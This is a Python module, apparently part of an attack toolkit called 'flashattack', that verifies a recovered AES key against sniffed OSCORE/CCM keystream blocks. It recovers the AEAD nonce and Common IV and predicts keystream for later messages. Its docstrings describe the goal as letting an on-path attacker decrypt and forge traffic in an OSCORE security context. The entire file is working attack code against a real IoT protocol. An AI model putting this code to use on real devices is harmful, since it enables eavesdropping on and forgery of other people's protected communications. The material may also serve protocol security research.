"""Confirming a recovered OSCORE key using only what the attacker can see.

The recovery hands back a candidate AES key. The attacker has AES *outputs*
(the CTR keystream blocks S_i = E(K, A_i) it read off the wire) but not the
inputs, because the CCM counter block

    A_1 = 0x01 | nonce(13) | 0x0001          (RFC 3610 s2.3, L = 2)

contains the OSCORE AEAD nonce, and that is the Common IV -- an HKDF output of
the master secret -- XORed with the public Partial IV. So there is no ready-made
plaintext/ciphertext pair to test a key against.

There is still a decisive check, and it is the break itself. Decrypt a keystream
block with the candidate key:

    A_1 = D(K, S_1)

If K is right, A_1 must have CCM's fixed structure: first byte 0x01, last two
bytes 0x0001. That is 24 bits per block, so a wrong key survives one block with
probability 2^-24 and t blocks with probability 2^-24t. And the moment it
passes, the attacker also *has* the nonce -- hence

    Common IV = nonce XOR nonce_frame(Partial IV, Sender ID)

with the Partial IV read from the OSCORE option on the wire. Key plus Common IV
is everything needed to decrypt and forge traffic in that security context.
"""
from __future__ import annotations

import numpy as np

from flashattack import aesref

CCM_FLAGS_L2 = 0x01


def aes_decrypt_block(key: bytes, block: np.ndarray) -> np.ndarray:
    """One AES-128 InvCipher block."""
    out = aesref.decrypt_blocks(key, np.asarray(block, np.uint8).reshape(1, 16))
    return np.asarray(out, np.uint8).reshape(16)


def counter_blocks(key: bytes, keystreams: np.ndarray) -> np.ndarray:
    ks = np.asarray(keystreams, np.uint8).reshape(-1, 16)
    return np.asarray(aesref.decrypt_blocks(key, ks), np.uint8).reshape(-1, 16)


def check(key: bytes, keystreams: np.ndarray, n: int = 8):
    """(ok, bits, first_nonce). `bits` is the log2 of how unlikely a wrong key is."""
    ks = np.asarray(keystreams, np.uint8).reshape(-1, 16)[:n]
    if len(ks) == 0:
        return False, 0.0, None
    a = counter_blocks(key, ks)
    ok = bool(np.all(a[:, 0] == CCM_FLAGS_L2)
              and np.all(a[:, 14] == 0x00)
              and np.all(a[:, 15] == 0x01))
    return ok, 24.0 * len(ks), (bytes(a[0, 1:14]) if ok else None)


def nonce_frame(piv: int, sender_id: bytes = b"", nonce_len: int = 13) -> bytes:
    """RFC 8613 s5.2: size-of-ID_PIV(1) | ID_PIV left-padded to nonce_len-6 |
    Partial IV left-padded to 5. Note a *response* reuses the request's nonce,
    so ID_PIV there is the client's Sender ID, not the server's."""
    S = nonce_len - 6
    frame = bytearray(nonce_len)
    frame[0] = len(sender_id) & 0xFF
    frame[1 + (S - len(sender_id)):1 + S] = sender_id
    frame[nonce_len - 5:] = piv.to_bytes(5, "big")
    return bytes(frame)


def common_iv(nonce: bytes, piv: int, sender_id: bytes = b"", nonce_len: int = 13):
    """RFC 8613 s5.2 run backwards: Common IV = nonce XOR the nonce frame."""
    f = nonce_frame(piv, sender_id, nonce_len)
    return bytes(np.frombuffer(nonce, np.uint8) ^ np.frombuffer(f, np.uint8))


def piv_residue(key: bytes, keystreams: np.ndarray, n: int = 64, span: int = 1 << 20):
    """What the response stream alone says about the absolute Partial IV.

    The nonce's low five bytes are Common IV XOR Partial IV, so one nonce cannot
    separate the two. Consecutive exchanges step the Partial IV by one, and
    addition does not commute with XOR, so the carry pattern constrains it -- but
    only to a residue class: n observed steps pin roughly log2(n) low bits, and
    no more. Returns (modulus, residue).

    This is a curiosity, not a limitation: the Partial IV travels in the clear in
    the OSCORE option of every request, so an on-path attacker simply reads it.
    """
    ks = np.asarray(keystreams, np.uint8).reshape(-1, 16)[:n]
    a = counter_blocks(key, ks)
    low = np.array([int.from_bytes(bytes(r[9:14]), "big") for r in a], dtype=np.int64)
    cand = np.arange(span, dtype=np.int64)
    civ = low[0] ^ cand
    ok = np.ones(span, bool)
    for i in range(1, len(low)):
        ok &= ((civ ^ (cand + i)) == low[i])
    hits = np.flatnonzero(ok)
    if hits.size == 0:
        return None, None
    step = int(hits[1] - hits[0]) if hits.size > 1 else span
    return step, int(hits[0])


def predict(key: bytes, keystreams: np.ndarray, piv0: int, i: int):
    """Predict exchange i's keystream from the key and the Partial IV alone --
    i.e. decrypt a message whose plaintext the attacker never knew."""
    ks = np.asarray(keystreams, np.uint8).reshape(-1, 16)
    a0 = counter_blocks(key, ks[:1])[0]
    civ_low = int.from_bytes(bytes(a0[9:14]), "big") ^ piv0
    blk = a0.copy()
    blk[9:14] = np.frombuffer((civ_low ^ (piv0 + i)).to_bytes(5, "big"), np.uint8)
    pred = np.asarray(aesref.encrypt_blocks(key, blk.reshape(1, 16)),
                      np.uint8).reshape(16)
    return bytes(pred), bytes(ks[i]), bool(np.array_equal(pred, ks[i]))


def report(key: bytes, keystreams: np.ndarray, piv: int | None = None,
           sender_id: bytes = b"", n: int = 8) -> str:
    ok, bits, nonce = check(key, keystreams, n)
    lines = [f"candidate key : {key.hex()}"]
    a = counter_blocks(key, np.asarray(keystreams)[:3])
    for i, row in enumerate(a):
        lines.append(f"  D(K, S_1) #{i} = {bytes(row).hex()}"
                     f"   flags={row[0]:#04x} ctr={row[14]:02x}{row[15]:02x}")
    if ok:
        lines.append(f"VERIFIED: every one of {n} counter blocks has CCM's "
                     f"0x01 / 0x0001 framing ({bits:.0f} bits; a wrong key would "
                     f"need luck of 2^-{bits:.0f})")
        lines.append(f"  recovered AEAD nonce   = {nonce.hex()}")
        if piv is not None:
            lines.append(f"  recovered Common IV    = "
                         f"{common_iv(nonce, piv, sender_id).hex()}")
    else:
        lines.append("NOT VERIFIED: counter blocks do not have CCM structure")
    return "\n".join(lines)
